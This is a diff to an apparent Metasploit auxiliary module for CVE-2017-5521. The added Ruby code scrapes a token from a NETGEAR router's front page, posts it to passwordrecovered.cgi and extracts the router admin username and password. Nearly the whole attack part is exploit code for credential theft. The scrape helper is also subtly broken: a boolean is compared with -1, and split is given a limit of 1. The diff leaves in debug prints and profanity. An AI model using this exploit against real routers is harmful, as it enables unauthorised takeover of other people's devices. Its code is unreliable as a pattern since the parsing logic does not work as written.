@@ -26,7 +26,8 @@ class MetasploitModule < Msf::Auxiliary
           [ 'CVE', 'CVE-2017-5521' ],
           [ 'URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911' ],
           [ 'URL', 'http://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],
-          [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/']
+          [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/'],
+          [ 'EDB', '41205']
         ],
       'License'        => MSF_LICENSE
     ))
@@ -37,6 +38,15 @@ class MetasploitModule < Msf::Auxiliary
       OptString::new('RHOST', [true, 'The router target ip address', nil]),
       OptBool::new('VERBOSE', [false, 'Add verbose output', false]) 
     ], self.class)
+  end
+
+  def scrape(text, start_trig, end_trig)
+    if text.include?(start_trig) != -1
+      puts "I'm scraping :D"
+      return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
+    else
+      return nil
+    end
   end
 
   def run
@@ -50,9 +60,34 @@ class MetasploitModule < Msf::Auxiliary
 
     is_ng = check
 
+    res = send_request_raw({ 'uri' => '/'})
 
     if is_ng == Exploit::CheckCode::Detected
+      token = scrape(res.to_s, "unauth.cgi?id=", "/")
+      if token == nil
+        print_error("#{rhost} is not vulnerable")
+        return
+      end
 
+      print_status("Token found: #{token}")
+      #url = "#{rhost}/passwordrecovered.cgi?id=#{token}"
+      
+      r = send_request_cgi({
+            'method'    => 'POST',
+            'uri'       => "/passwordrecovered.cgi?id=#{token}"
+        })
+        
+      # maybe use .match? here  
+      if r.to_s.rindex('Left\">') != nil
+        username = scrape(r.to_s, 'Router Admin Username</td>', '</td>')
+        username = scrape(username, '>', '\'')
+        password = scrape(r.to_s, 'Router Admin Password</td>', '</td>')
+        password = scrape(password, '>', '\'')
+        puts username
+        puts password
+      else # for debugging :)
+        puts "fuck"
+      end
     else
       return
     end
